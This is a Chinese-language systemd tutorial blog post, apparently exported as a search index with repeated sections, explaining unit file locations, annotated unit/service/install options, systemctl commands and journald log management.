配置文件目录 系统配置文件目录 /etc/systemd/system/ 的优先级最高, 建议放在这. 其次为 /usr/lib/systemd/system/. 例如我用 apt 安装 nginx 后, 它的配置就放在这里. /usr/lib/systemd/user/ 存放用户的配置, 但是一般不用!!! 因为必须 user session 处于活动状态 可以参考 Where do I put my systemd unit file? , 以及文档 systemd.unit-freedesktop, systemd.unit(5)-arch systemctl enable supervisor 配置开机自启, 会在对应 target 的 wants 目录下, 添加一个软链接. # 启用supervisor systemctl enable supervisor --now Created symlink /etc/systemd/system/multi-user.target.wants/supervisor.service → /lib/systemd/system/supervisor.service # 我们看一下这个目录下的内容, 都是类似的符号链接 /etc/systemd/system/multi-user.target.wants# ll drwxr-xr-x 2 root root 4096 Jul 29 22:10 ./ drwxr-xr-x 16 root root 4096 Jul 27 00:03 ../ ... lrwxrwxrwx 1 root root 34 Apr 19 14:41 aliyun.service -\u003e /etc/systemd/system/aliyun.service lrwxrwxrwx 1 root root 38 Jul 29 22:10 supervisor.service -\u003e /lib/systemd/system/supervisor.service ... 为什么是 multi-user.target 这个 target 呢? 可以跳到下面看 配置文件中的Install. ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#配置文件目录"},{"categories":["blog"],"content":" 配置示例 - 复制使用配置文件主要有 3 部分. Unit: 启动顺序与依赖关系 Service: 启动行为 Install 给 systemctl 用的, 其实与 守护进程systemd 无关. [Unit] Description=测试服务 # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] # 环境变量 $MY_ENV1 # Environment=MY_ENV1=value1 # Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 # EnvironmentFile=/path/to/environment/file1 WorkingDirectory=/root/myApp/TestServer ExecStart=/root/myApp/TestServer/TestServer # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed # 最大文件打开数不限制 LimitNOFILE=infinity # 子线程数量不限制 TasksMax=infinity [Install] WantedBy=multi-user.target # Alias=testserver.service # Alias常见用法还有 ftp别名ftpd ssh别名sshd 配置文件的默认值在 /etc/systemd/system.conf 中. ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#配置示例---复制使用"},{"categories":["blog"],"content":" 配置详情 Unit [Unit] # 简短描述 Description=我的服务 # 文档地址 Documentation=https://ken.kentxxq.com # 依赖a-Unit和b-Unit,a或b任意一个没运行,启动失败 Requires=a.service b.service # 需要a-Unit,a没运行,不影响我 Wants=a.service # a-Unit退出,我就停止运行 BindsTo=a.service # a-Unit在我之后启动 Before=a.service # a-Unit在我之前启动 After=a.service # a-Unit不能与我同时运行 Conflicts=a.service # Condition开头 必须满足所有条件我才会运行 # 下面是路径存在就运行 ConditionPathExists=/usr/bin/myprogram # 文件不是空的才运行 ConditionFileNotEmpty=/etc/keepalived/keepalived.conf # Assert开头 必须满足所有条件,否则会报错启动失败 AssertPathExists=/usr/bin/myprogram # 这个文件有运行权限 AssertFileIsExecutable=/xxxx # 启动时间区间,单位秒. StartLimitIntervalSec=30 # 在StartLimitIntervalSec时间内,只会尝试启动3次 StartLimitBurst=3 Service [Service] # 默认值,ExecStart就是主进程 Type=simple # 主进程创建子进程,父进程立即退出 Type=forking # 代替rc.local,执行开机启动. 搭配RemainAfterExit=yes,让systemd显示状态active,让你知道已经执行过了.必须成功退出 Type=oneshot # 和上面的区别是只要执行了就行,不一定要成功 Type=exec # 服务启动以后,通过sd_notify(3)发送通知给systemd,才算启动成功.containerd有用到 Type=notify # 运行用户和组,默认root用户/root组 User=kentxxq Group=kentxxq # 运行目录 WorkingDirectory=/path # 启动前执行,失败不会执行ExecStart # 启动前加载overlay内核模块, -减号 代表失败了也不影响ExecStart # ExecStartPre=-/sbin/modprobe overlay ExecStartPre=ls # 启动命令.可以存在多个,然后会顺序执行.可能是为了调试方便? ExecStart= ExecStart=/usr/bin/xxx \\ --aaa=xxx \\ --bbb=xxx # 启动后执行 ExecStartPost=ls # systemctl reload执行 ExecReload=nginx -s reload # 停止服务前执行命令,做一些清理工作 ExecStop=nginx -s stop # 停止前等待多少秒 TimeoutStopSec=10 # 停止以后执行的命令,例如检查nginx端口是否还在监听? ExecStopPost=ls # 重启间隔时间 s/min/h/d RestartSec=30s # 重启的配置, 会受到Unit单元的StartLimit影响!!! # always,on-success、on-failure、on-abnormal、on-abort、on-watchdog. Restart=always # 杀死模式 # 默认control-group # control-group执行ExecStop后,向cgroup中所有进程先term后发送kill # mixed会在cgroup的子进程全部先term,再kill后,才开始term,再kill主进程 # process仅主进程发送term后发送kill(containerd只杀主进程) # none只是执行ExecStop命令 KillMode=mixed # 确认只处理term信号,不需要发送kill命令,可以不发送. # 配合TimeoutStopSec=infinity 使用,一直等待term信号处理完成 SendSIGKILL=no # 修改杀死信号,默认是SIGTERM RestartKillSignal=SIGHUP # 环境变量 $MY_ENV1 $MY_ENV2 Environment=MY_ENV1=value1 Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 EnvironmentFile=/path/to/environment/file1 # 日志文件 # 标准输出路径 StandardOutput=append:/tmp/my-service.log # 标准输出路径 StandardError=append:/tmp/my-service.log # 定义一个名字 SyslogIdentifier=my-service # 其他 # 保护/proc文件系统,其他进程无法修改,保证安全性. minio有用到 ProtectProc=invisible # 可以打开的文件数/文件描述符=无限 默认是system.conf:#DefaultLimitNOFILE=1024:524288 LimitNOFILE=infinity # 允许核心转储文件无限大,containerd有用到 LimitCORE=infinity # 最大进程数无限 LimitNPROC=infinity # 最大线程数=无限,默认4915. TasksMax比LimitNPROC更常用,参考回答https://unix.stackexchange.com/questions/452284/managing-nproc-in-systemd TasksMax=infinity # 开启后将其cgroup下资源控制交给进程自己管理,containerd有用到. Delegate=yes # -1000到1000,-999代表优先级很高.发生oom的时候,内核尽量先杀其他进程,保留这个. containerd有用到 OOMScoreAdjust=-999 # 私有的临时文件目录.systemd自动清理,通过隔离保证安全性.nginx有用到 PrivateTmp=true Install 守护进程 systemd 完全不会处理这部分. 这部分是让 systemctl enable 用的. systemctl get-default 得到启动时默认的 target. 服务器先启动到 multi-user,然后再 graphical.target. 而通常服务器没有 UI. 常用多用户命令行 multi-user. 图形 graphical.target,图形用于开机启动 qq, 钉钉. systemctl set-default multi-user.target 可以调整默认 target. [Install] # 放到.wants下面,到了通常用这个 WantedBy=multi-user.target # 放到.required下面, 如果依赖没成功,就抛出错误,不尝试启动 RequiredBy=b.service # 启动别名,必须要enable后才能使用哦! Alias=a.service ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#配置详情"},{"categories":["blog"],"content":" 配置详情 Unit [Unit] # 简短描述 Description=我的服务 # 文档地址 Documentation=https://ken.kentxxq.com # 依赖a-Unit和b-Unit,a或b任意一个没运行,启动失败 Requires=a.service b.service # 需要a-Unit,a没运行,不影响我 Wants=a.service # a-Unit退出,我就停止运行 BindsTo=a.service # a-Unit在我之后启动 Before=a.service # a-Unit在我之前启动 After=a.service # a-Unit不能与我同时运行 Conflicts=a.service # Condition开头 必须满足所有条件我才会运行 # 下面是路径存在就运行 ConditionPathExists=/usr/bin/myprogram # 文件不是空的才运行 ConditionFileNotEmpty=/etc/keepalived/keepalived.conf # Assert开头 必须满足所有条件,否则会报错启动失败 AssertPathExists=/usr/bin/myprogram # 这个文件有运行权限 AssertFileIsExecutable=/xxxx # 启动时间区间,单位秒. StartLimitIntervalSec=30 # 在StartLimitIntervalSec时间内,只会尝试启动3次 StartLimitBurst=3 Service [Service] # 默认值,ExecStart就是主进程 Type=simple # 主进程创建子进程,父进程立即退出 Type=forking # 代替rc.local,执行开机启动. 搭配RemainAfterExit=yes,让systemd显示状态active,让你知道已经执行过了.必须成功退出 Type=oneshot # 和上面的区别是只要执行了就行,不一定要成功 Type=exec # 服务启动以后,通过sd_notify(3)发送通知给systemd,才算启动成功.containerd有用到 Type=notify # 运行用户和组,默认root用户/root组 User=kentxxq Group=kentxxq # 运行目录 WorkingDirectory=/path # 启动前执行,失败不会执行ExecStart # 启动前加载overlay内核模块, -减号 代表失败了也不影响ExecStart # ExecStartPre=-/sbin/modprobe overlay ExecStartPre=ls # 启动命令.可以存在多个,然后会顺序执行.可能是为了调试方便? ExecStart= ExecStart=/usr/bin/xxx \\ --aaa=xxx \\ --bbb=xxx # 启动后执行 ExecStartPost=ls # systemctl reload执行 ExecReload=nginx -s reload # 停止服务前执行命令,做一些清理工作 ExecStop=nginx -s stop # 停止前等待多少秒 TimeoutStopSec=10 # 停止以后执行的命令,例如检查nginx端口是否还在监听? ExecStopPost=ls # 重启间隔时间 s/min/h/d RestartSec=30s # 重启的配置, 会受到Unit单元的StartLimit影响!!! # always,on-success、on-failure、on-abnormal、on-abort、on-watchdog. Restart=always # 杀死模式 # 默认control-group # control-group执行ExecStop后,向cgroup中所有进程先term后发送kill # mixed会在cgroup的子进程全部先term,再kill后,才开始term,再kill主进程 # process仅主进程发送term后发送kill(containerd只杀主进程) # none只是执行ExecStop命令 KillMode=mixed # 确认只处理term信号,不需要发送kill命令,可以不发送. # 配合TimeoutStopSec=infinity 使用,一直等待term信号处理完成 SendSIGKILL=no # 修改杀死信号,默认是SIGTERM RestartKillSignal=SIGHUP # 环境变量 $MY_ENV1 $MY_ENV2 Environment=MY_ENV1=value1 Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 EnvironmentFile=/path/to/environment/file1 # 日志文件 # 标准输出路径 StandardOutput=append:/tmp/my-service.log # 标准输出路径 StandardError=append:/tmp/my-service.log # 定义一个名字 SyslogIdentifier=my-service # 其他 # 保护/proc文件系统,其他进程无法修改,保证安全性. minio有用到 ProtectProc=invisible # 可以打开的文件数/文件描述符=无限 默认是system.conf:#DefaultLimitNOFILE=1024:524288 LimitNOFILE=infinity # 允许核心转储文件无限大,containerd有用到 LimitCORE=infinity # 最大进程数无限 LimitNPROC=infinity # 最大线程数=无限,默认4915. TasksMax比LimitNPROC更常用,参考回答https://unix.stackexchange.com/questions/452284/managing-nproc-in-systemd TasksMax=infinity # 开启后将其cgroup下资源控制交给进程自己管理,containerd有用到. Delegate=yes # -1000到1000,-999代表优先级很高.发生oom的时候,内核尽量先杀其他进程,保留这个. containerd有用到 OOMScoreAdjust=-999 # 私有的临时文件目录.systemd自动清理,通过隔离保证安全性.nginx有用到 PrivateTmp=true Install 守护进程 systemd 完全不会处理这部分. 这部分是让 systemctl enable 用的. systemctl get-default 得到启动时默认的 target. 服务器先启动到 multi-user,然后再 graphical.target. 而通常服务器没有 UI. 常用多用户命令行 multi-user. 图形 graphical.target,图形用于开机启动 qq, 钉钉. systemctl set-default multi-user.target 可以调整默认 target. [Install] # 放到.wants下面,到了通常用这个 WantedBy=multi-user.target # 放到.required下面, 如果依赖没成功,就抛出错误,不尝试启动 RequiredBy=b.service # 启动别名,必须要enable后才能使用哦! Alias=a.service ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#unit"},{"categories":["blog"],"content":" 配置详情 Unit [Unit] # 简短描述 Description=我的服务 # 文档地址 Documentation=https://ken.kentxxq.com # 依赖a-Unit和b-Unit,a或b任意一个没运行,启动失败 Requires=a.service b.service # 需要a-Unit,a没运行,不影响我 Wants=a.service # a-Unit退出,我就停止运行 BindsTo=a.service # a-Unit在我之后启动 Before=a.service # a-Unit在我之前启动 After=a.service # a-Unit不能与我同时运行 Conflicts=a.service # Condition开头 必须满足所有条件我才会运行 # 下面是路径存在就运行 ConditionPathExists=/usr/bin/myprogram # 文件不是空的才运行 ConditionFileNotEmpty=/etc/keepalived/keepalived.conf # Assert开头 必须满足所有条件,否则会报错启动失败 AssertPathExists=/usr/bin/myprogram # 这个文件有运行权限 AssertFileIsExecutable=/xxxx # 启动时间区间,单位秒. StartLimitIntervalSec=30 # 在StartLimitIntervalSec时间内,只会尝试启动3次 StartLimitBurst=3 Service [Service] # 默认值,ExecStart就是主进程 Type=simple # 主进程创建子进程,父进程立即退出 Type=forking # 代替rc.local,执行开机启动. 搭配RemainAfterExit=yes,让systemd显示状态active,让你知道已经执行过了.必须成功退出 Type=oneshot # 和上面的区别是只要执行了就行,不一定要成功 Type=exec # 服务启动以后,通过sd_notify(3)发送通知给systemd,才算启动成功.containerd有用到 Type=notify # 运行用户和组,默认root用户/root组 User=kentxxq Group=kentxxq # 运行目录 WorkingDirectory=/path # 启动前执行,失败不会执行ExecStart # 启动前加载overlay内核模块, -减号 代表失败了也不影响ExecStart # ExecStartPre=-/sbin/modprobe overlay ExecStartPre=ls # 启动命令.可以存在多个,然后会顺序执行.可能是为了调试方便? ExecStart= ExecStart=/usr/bin/xxx \\ --aaa=xxx \\ --bbb=xxx # 启动后执行 ExecStartPost=ls # systemctl reload执行 ExecReload=nginx -s reload # 停止服务前执行命令,做一些清理工作 ExecStop=nginx -s stop # 停止前等待多少秒 TimeoutStopSec=10 # 停止以后执行的命令,例如检查nginx端口是否还在监听? ExecStopPost=ls # 重启间隔时间 s/min/h/d RestartSec=30s # 重启的配置, 会受到Unit单元的StartLimit影响!!! # always,on-success、on-failure、on-abnormal、on-abort、on-watchdog. Restart=always # 杀死模式 # 默认control-group # control-group执行ExecStop后,向cgroup中所有进程先term后发送kill # mixed会在cgroup的子进程全部先term,再kill后,才开始term,再kill主进程 # process仅主进程发送term后发送kill(containerd只杀主进程) # none只是执行ExecStop命令 KillMode=mixed # 确认只处理term信号,不需要发送kill命令,可以不发送. # 配合TimeoutStopSec=infinity 使用,一直等待term信号处理完成 SendSIGKILL=no # 修改杀死信号,默认是SIGTERM RestartKillSignal=SIGHUP # 环境变量 $MY_ENV1 $MY_ENV2 Environment=MY_ENV1=value1 Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 EnvironmentFile=/path/to/environment/file1 # 日志文件 # 标准输出路径 StandardOutput=append:/tmp/my-service.log # 标准输出路径 StandardError=append:/tmp/my-service.log # 定义一个名字 SyslogIdentifier=my-service # 其他 # 保护/proc文件系统,其他进程无法修改,保证安全性. minio有用到 ProtectProc=invisible # 可以打开的文件数/文件描述符=无限 默认是system.conf:#DefaultLimitNOFILE=1024:524288 LimitNOFILE=infinity # 允许核心转储文件无限大,containerd有用到 LimitCORE=infinity # 最大进程数无限 LimitNPROC=infinity # 最大线程数=无限,默认4915. TasksMax比LimitNPROC更常用,参考回答https://unix.stackexchange.com/questions/452284/managing-nproc-in-systemd TasksMax=infinity # 开启后将其cgroup下资源控制交给进程自己管理,containerd有用到. Delegate=yes # -1000到1000,-999代表优先级很高.发生oom的时候,内核尽量先杀其他进程,保留这个. containerd有用到 OOMScoreAdjust=-999 # 私有的临时文件目录.systemd自动清理,通过隔离保证安全性.nginx有用到 PrivateTmp=true Install 守护进程 systemd 完全不会处理这部分. 这部分是让 systemctl enable 用的. systemctl get-default 得到启动时默认的 target. 服务器先启动到 multi-user,然后再 graphical.target. 而通常服务器没有 UI. 常用多用户命令行 multi-user. 图形 graphical.target,图形用于开机启动 qq, 钉钉. systemctl set-default multi-user.target 可以调整默认 target. [Install] # 放到.wants下面,到了通常用这个 WantedBy=multi-user.target # 放到.required下面, 如果依赖没成功,就抛出错误,不尝试启动 RequiredBy=b.service # 启动别名,必须要enable后才能使用哦! Alias=a.service ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#service"},{"categories":["blog"],"content":" 配置详情 Unit [Unit] # 简短描述 Description=我的服务 # 文档地址 Documentation=https://ken.kentxxq.com # 依赖a-Unit和b-Unit,a或b任意一个没运行,启动失败 Requires=a.service b.service # 需要a-Unit,a没运行,不影响我 Wants=a.service # a-Unit退出,我就停止运行 BindsTo=a.service # a-Unit在我之后启动 Before=a.service # a-Unit在我之前启动 After=a.service # a-Unit不能与我同时运行 Conflicts=a.service # Condition开头 必须满足所有条件我才会运行 # 下面是路径存在就运行 ConditionPathExists=/usr/bin/myprogram # 文件不是空的才运行 ConditionFileNotEmpty=/etc/keepalived/keepalived.conf # Assert开头 必须满足所有条件,否则会报错启动失败 AssertPathExists=/usr/bin/myprogram # 这个文件有运行权限 AssertFileIsExecutable=/xxxx # 启动时间区间,单位秒. StartLimitIntervalSec=30 # 在StartLimitIntervalSec时间内,只会尝试启动3次 StartLimitBurst=3 Service [Service] # 默认值,ExecStart就是主进程 Type=simple # 主进程创建子进程,父进程立即退出 Type=forking # 代替rc.local,执行开机启动. 搭配RemainAfterExit=yes,让systemd显示状态active,让你知道已经执行过了.必须成功退出 Type=oneshot # 和上面的区别是只要执行了就行,不一定要成功 Type=exec # 服务启动以后,通过sd_notify(3)发送通知给systemd,才算启动成功.containerd有用到 Type=notify # 运行用户和组,默认root用户/root组 User=kentxxq Group=kentxxq # 运行目录 WorkingDirectory=/path # 启动前执行,失败不会执行ExecStart # 启动前加载overlay内核模块, -减号 代表失败了也不影响ExecStart # ExecStartPre=-/sbin/modprobe overlay ExecStartPre=ls # 启动命令.可以存在多个,然后会顺序执行.可能是为了调试方便? ExecStart= ExecStart=/usr/bin/xxx \\ --aaa=xxx \\ --bbb=xxx # 启动后执行 ExecStartPost=ls # systemctl reload执行 ExecReload=nginx -s reload # 停止服务前执行命令,做一些清理工作 ExecStop=nginx -s stop # 停止前等待多少秒 TimeoutStopSec=10 # 停止以后执行的命令,例如检查nginx端口是否还在监听? ExecStopPost=ls # 重启间隔时间 s/min/h/d RestartSec=30s # 重启的配置, 会受到Unit单元的StartLimit影响!!! # always,on-success、on-failure、on-abnormal、on-abort、on-watchdog. Restart=always # 杀死模式 # 默认control-group # control-group执行ExecStop后,向cgroup中所有进程先term后发送kill # mixed会在cgroup的子进程全部先term,再kill后,才开始term,再kill主进程 # process仅主进程发送term后发送kill(containerd只杀主进程) # none只是执行ExecStop命令 KillMode=mixed # 确认只处理term信号,不需要发送kill命令,可以不发送. # 配合TimeoutStopSec=infinity 使用,一直等待term信号处理完成 SendSIGKILL=no # 修改杀死信号,默认是SIGTERM RestartKillSignal=SIGHUP # 环境变量 $MY_ENV1 $MY_ENV2 Environment=MY_ENV1=value1 Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 EnvironmentFile=/path/to/environment/file1 # 日志文件 # 标准输出路径 StandardOutput=append:/tmp/my-service.log # 标准输出路径 StandardError=append:/tmp/my-service.log # 定义一个名字 SyslogIdentifier=my-service # 其他 # 保护/proc文件系统,其他进程无法修改,保证安全性. minio有用到 ProtectProc=invisible # 可以打开的文件数/文件描述符=无限 默认是system.conf:#DefaultLimitNOFILE=1024:524288 LimitNOFILE=infinity # 允许核心转储文件无限大,containerd有用到 LimitCORE=infinity # 最大进程数无限 LimitNPROC=infinity # 最大线程数=无限,默认4915. TasksMax比LimitNPROC更常用,参考回答https://unix.stackexchange.com/questions/452284/managing-nproc-in-systemd TasksMax=infinity # 开启后将其cgroup下资源控制交给进程自己管理,containerd有用到. Delegate=yes # -1000到1000,-999代表优先级很高.发生oom的时候,内核尽量先杀其他进程,保留这个. containerd有用到 OOMScoreAdjust=-999 # 私有的临时文件目录.systemd自动清理,通过隔离保证安全性.nginx有用到 PrivateTmp=true Install 守护进程 systemd 完全不会处理这部分. 这部分是让 systemctl enable 用的. systemctl get-default 得到启动时默认的 target. 服务器先启动到 multi-user,然后再 graphical.target. 而通常服务器没有 UI. 常用多用户命令行 multi-user. 图形 graphical.target,图形用于开机启动 qq, 钉钉. systemctl set-default multi-user.target 可以调整默认 target. [Install] # 放到.wants下面,到了通常用这个 WantedBy=multi-user.target # 放到.required下面, 如果依赖没成功,就抛出错误,不尝试启动 RequiredBy=b.service # 启动别名,必须要enable后才能使用哦! Alias=a.service ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#install"},{"categories":["blog"],"content":" Systemd 相关组件","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#systemd-相关组件"},{"categories":["blog"],"content":" systemctl 命令 启停配置 # 系统 # 重启系统 systemctl reboot # 关闭系统,切断电源 systemctl poweroff # 服务状态 systemctl status nginx # 服务开启 systemctl start nginx # 服务配置重新加载 systemctl daemon-reload # 服务重启 # 发送term信号,然后xx秒后,kill命令.然后重新拉起 systemctl restart nginx # 服务重启 systemctl stop nginx 查询详情 # 查询所有的target状态,简介 systemctl list-units --type target # 查询所有的service状态,简介 systemctl list-units --type service # 查看服务的完整参数 systemctl show nginx # 查看所有unit文件是否可以运行,是否开机启动 # enabled,disabled 是否建立启动连接. # static 没有[Install],只能被依赖 # masked 禁止建立启动链接 systemctl list-unit-files 依赖关系 # 查询target下的service systemctl list-dependencies multi-user.target systemctl list-dependencies nginx.service systemctl list-dependencies --all nginx.service 服务状态确认 # 帮助确认状态 # 显示某个 Unit 是否正在运行 systemctl is-active nginx.service # 显示某个 Unit 是否处于启动失败状态 systemctl is-failed nginx.service # 显示某个 Unit 服务是否建立了启动链接 systemctl is-enabled nginx.service ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#systemctl-命令"},{"categories":["blog"],"content":" systemctl 命令 启停配置 # 系统 # 重启系统 systemctl reboot # 关闭系统,切断电源 systemctl poweroff # 服务状态 systemctl status nginx # 服务开启 systemctl start nginx # 服务配置重新加载 systemctl daemon-reload # 服务重启 # 发送term信号,然后xx秒后,kill命令.然后重新拉起 systemctl restart nginx # 服务重启 systemctl stop nginx 查询详情 # 查询所有的target状态,简介 systemctl list-units --type target # 查询所有的service状态,简介 systemctl list-units --type service # 查看服务的完整参数 systemctl show nginx # 查看所有unit文件是否可以运行,是否开机启动 # enabled,disabled 是否建立启动连接. # static 没有[Install],只能被依赖 # masked 禁止建立启动链接 systemctl list-unit-files 依赖关系 # 查询target下的service systemctl list-dependencies multi-user.target systemctl list-dependencies nginx.service systemctl list-dependencies --all nginx.service 服务状态确认 # 帮助确认状态 # 显示某个 Unit 是否正在运行 systemctl is-active nginx.service # 显示某个 Unit 是否处于启动失败状态 systemctl is-failed nginx.service # 显示某个 Unit 服务是否建立了启动链接 systemctl is-enabled nginx.service ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#启停配置"},{"categories":["blog"],"content":" systemctl 命令 启停配置 # 系统 # 重启系统 systemctl reboot # 关闭系统,切断电源 systemctl poweroff # 服务状态 systemctl status nginx # 服务开启 systemctl start nginx # 服务配置重新加载 systemctl daemon-reload # 服务重启 # 发送term信号,然后xx秒后,kill命令.然后重新拉起 systemctl restart nginx # 服务重启 systemctl stop nginx 查询详情 # 查询所有的target状态,简介 systemctl list-units --type target # 查询所有的service状态,简介 systemctl list-units --type service # 查看服务的完整参数 systemctl show nginx # 查看所有unit文件是否可以运行,是否开机启动 # enabled,disabled 是否建立启动连接. # static 没有[Install],只能被依赖 # masked 禁止建立启动链接 systemctl list-unit-files 依赖关系 # 查询target下的service systemctl list-dependencies multi-user.target systemctl list-dependencies nginx.service systemctl list-dependencies --all nginx.service 服务状态确认 # 帮助确认状态 # 显示某个 Unit 是否正在运行 systemctl is-active nginx.service # 显示某个 Unit 是否处于启动失败状态 systemctl is-failed nginx.service # 显示某个 Unit 服务是否建立了启动链接 systemctl is-enabled nginx.service ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#查询详情"},{"categories":["blog"],"content":" systemctl 命令 启停配置 # 系统 # 重启系统 systemctl reboot # 关闭系统,切断电源 systemctl poweroff # 服务状态 systemctl status nginx # 服务开启 systemctl start nginx # 服务配置重新加载 systemctl daemon-reload # 服务重启 # 发送term信号,然后xx秒后,kill命令.然后重新拉起 systemctl restart nginx # 服务重启 systemctl stop nginx 查询详情 # 查询所有的target状态,简介 systemctl list-units --type target # 查询所有的service状态,简介 systemctl list-units --type service # 查看服务的完整参数 systemctl show nginx # 查看所有unit文件是否可以运行,是否开机启动 # enabled,disabled 是否建立启动连接. # static 没有[Install],只能被依赖 # masked 禁止建立启动链接 systemctl list-unit-files 依赖关系 # 查询target下的service systemctl list-dependencies multi-user.target systemctl list-dependencies nginx.service systemctl list-dependencies --all nginx.service 服务状态确认 # 帮助确认状态 # 显示某个 Unit 是否正在运行 systemctl is-active nginx.service # 显示某个 Unit 是否处于启动失败状态 systemctl is-failed nginx.service # 显示某个 Unit 服务是否建立了启动链接 systemctl is-enabled nginx.service ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#依赖关系"},{"categories":["blog"],"content":" systemctl 命令 启停配置 # 系统 # 重启系统 systemctl reboot # 关闭系统,切断电源 systemctl poweroff # 服务状态 systemctl status nginx # 服务开启 systemctl start nginx # 服务配置重新加载 systemctl daemon-reload # 服务重启 # 发送term信号,然后xx秒后,kill命令.然后重新拉起 systemctl restart nginx # 服务重启 systemctl stop nginx 查询详情 # 查询所有的target状态,简介 systemctl list-units --type target # 查询所有的service状态,简介 systemctl list-units --type service # 查看服务的完整参数 systemctl show nginx # 查看所有unit文件是否可以运行,是否开机启动 # enabled,disabled 是否建立启动连接. # static 没有[Install],只能被依赖 # masked 禁止建立启动链接 systemctl list-unit-files 依赖关系 # 查询target下的service systemctl list-dependencies multi-user.target systemctl list-dependencies nginx.service systemctl list-dependencies --all nginx.service 服务状态确认 # 帮助确认状态 # 显示某个 Unit 是否正在运行 systemctl is-active nginx.service # 显示某个 Unit 是否处于启动失败状态 systemctl is-failed nginx.service # 显示某个 Unit 服务是否建立了启动链接 systemctl is-enabled nginx.service ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#服务状态确认"},{"categories":["blog"],"content":" journal 日志journald 的配置文件路径 /etc/systemd/journald.conf [Journal] # 最大保存5G,默认最大4G.或者存储空间的10% SystemMaxUse=5G # 最多保留7天.默认为0. MaxRetentionSec=7day # 重启生效 systemctl status systemd-journald 常用命令如下: # 滚动查看日志 journalctl -u nginx.service -f # 日志空间占用 journalctl --disk-usage # 自动清理,默认是4G /etc/systemd/journald.conf SystemMaxUse=10G systemctl restart systemd-journald # 手动清理 # 通常日志会存放在这样的目录里 /var/log/journal/2195e6a94ece4443abc39350bd0f8b5f # 进入以后,手动清空所有日志 :\u003esystem.journal # 保留1秒, 2d 保留2天 1w 保留一周 journalctl --vacuum-time=1s # 保留500m journalctl --vacuum-size=500M ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:3:2","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#journal-日志"},{"categories":["blog"],"content":" 使用建议 命令太长, 搭配alias使用 ","date":"2023-07-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["blog","linux"],"title":"Systemd教程","uri":"/posts/%E7%AC%94%E8%AE%B0/systemd%E6%95%99%E7%A8%8B/#使用建议"},{"categories":["blog"],"content":" 参考文档 systemd.unit Systemd 入门教程：命令篇 - 阮一峰的网络日志 Systemd 入门教程：实战篇 - 阮一峰的网络日志 systemd详解 | learn-systemd System and Service Manager runlevel 